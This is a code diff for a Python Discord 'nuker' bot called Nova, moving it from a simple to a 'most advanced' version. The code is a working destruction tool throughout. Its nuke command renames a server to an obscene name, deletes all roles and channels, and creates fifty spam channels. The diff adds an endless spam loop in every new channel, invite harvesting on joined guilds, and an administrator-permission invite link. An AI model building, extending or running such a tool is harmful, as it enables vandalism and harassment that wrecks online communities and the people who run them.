@@ -1,10 +1,8 @@
-# Simple Nuker by - https://github.com/Day420
+# Most Advanced Nuker by - https://github.com/Day420
 
 import ctypes
 import os
-import asyncio
 import discord
-import time
 from discord.ext import commands
 from colorama import *
 
@@ -14,6 +12,7 @@ e = Fore.RED
 y = Fore.YELLOW
 g = Fore.GREEN
 Nova = discord.Client()
+width = os.get_terminal_size().columns
 
 def clear():
     os.system("cls")
@@ -22,18 +21,18 @@ def title(title):
     ctypes.windll.kernel32.SetConsoleTitleW(title)
 
 def menu():
-    os.system('mode con: cols=83 lines=30')
-    title("Nova - Setup - Simple Nuker")
+    os.system('mode con: cols=109 lines=30')
+    title("Nova 1.2 - Setup - Most advanced nuker")
     clear()
-    print(f"""{m} 
- ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ 
- ████╗  ██║██╔═══██╗██║   ██║██╔══██╗
- ██╔██╗ ██║██║   ██║██║   ██║███████║
- ██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║
- ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
- ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝{r}
- {m}|{r} Simple Discord nuker by https://github.com/Day420
- """)
+    print(f"""{m}""")
+    print("███╗   ██╗ ██████╗ ██╗   ██╗ █████╗".center(width))
+    print("████╗  ██║██╔═══██╗██║   ██║██╔══██╗".center(width))
+    print("██╔██╗ ██║██║   ██║██║   ██║███████║".center(width))
+    print("██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║".center(width))
+    print("██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║".center(width))
+    print("╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝".center(width))
+    print(r + "https://github.com/Day420/Nova".center(width))
+    print(m + "─"*width)
     if not os.path.isfile('.token'):
         token = input(f" {m}|{r} Bot token : ")
         f = open(".token", "w")
@@ -122,29 +121,58 @@ def main():
     Nova.remove_command('help')
     @Nova.event
     async def on_ready():
+        title(f"Nova 1.2 - {Nova.user} - Most advanced nuker")
+        if len(Nova.guilds) > 1:
+            guildpl = "guilds"
+        else:
+            guildpl = "guild"
         activity = discord.Game(name=f"Nova | {prefix}", type=3)
         await Nova.change_presence(status=discord.Status.dnd, activity=activity)
         clear()
-        print(f"""{m} 
- ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ 
- ████╗  ██║██╔═══██╗██║   ██║██╔══██╗
- ██╔██╗ ██║██║   ██║██║   ██║███████║
- ██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║
- ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
- ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝{r}
- {m}|{r} Simple Discord nuker by https://github.com/Day420
- """)
-        title(f"Nova - {Nova.user} - Simple Nuker")
-        print(f" {m}|{r} Bot : {Nova.user}")
+        print(f"""{m}""")
+        print("███╗   ██╗ ██████╗ ██╗   ██╗ █████╗".center(width))
+        print("████╗  ██║██╔═══██╗██║   ██║██╔══██╗".center(width))
+        print("██╔██╗ ██║██║   ██║██║   ██║███████║".center(width))
+        print("██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║".center(width))
+        print("██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║".center(width))
+        print("╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝".center(width))
+        print(r + "https://github.com/Day420/Nova".center(width))
+        print(m + "─"*width)
+        print(f" {m}|{r} Bot : {Nova.user} ({len(Nova.guilds)} {guildpl})")
         print(f" {m}|{r} Prefix : {prefix}")
-        print(f" {m}|{r} Channels name : {channelsname}")
         print(f" {m}|{r} Spam message : {spammessage}")
+        print(f" {m}|{r} Channels name : {channelsname}")
         print(f"")
+        print(f" {m}|{r} Invite : https://discord.com/api/oauth2/authorize?client_id={Nova.user.id}&permissions=8&scope=bot")
+        print(f"")
+
+    @Nova.event
+    async def on_guild_channel_create(channel):
+        while True:
+            await channel.send(spammessage)
+            print(f" {y}|{r} Sent : {spammessage}")
+
+    @Nova.event
+    async def on_guild_join(guild):
+        for channel in guild.text_channels:
+            if channel.permissions_for(guild.me).create_instant_invite:
+                invite = await channel.create_invite()
+                break
+        print(f" {y}|{r} Joined new guild : {guild.name} ({guild.id}) {invite}")
 
     @Nova.command()
     async def nuke(ctx):
         await ctx.message.delete()
         print(f" {y}|{r} Nuking {ctx.guild.name} ({ctx.guild.id})...")
+        await ctx.guild.edit(name="Fucked by Nova")
+        for role in ctx.guild.roles:
+            try:
+                await role.delete()
+                print(f" {g}|{r} Deleted : @{role.name}")
+            except:
+                pass
+                print(f" {e}|{r} Couldnt delete : @{role.name}")
+
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
@@ -154,16 +182,16 @@ def main():
                 print(f" {e}|{r} Couldnt delete : #{channel.name}")
         try:
             for i in range(50):
-                channel = await ctx.guild.create_text_channel(channelsname)
-                await channel.send(spammessage)
-                print(f" {g}|{r} Created : #{channel.name} and sent message : {spammessage}")
+                await ctx.guild.create_text_channel(channelsname)
+                print(f" {g}|{r} Created : #{channel.name}")
         except Exception as er:
             print(f" {e}|{r} Error : {er}")
+
     try:
         Nova.run(token)
     except Exception as er:
         pass
-        print(f" {e}|{r} Invalid token.")
+        print(f" {e}|{r} Error : {e}")
         input()
 
 while True:
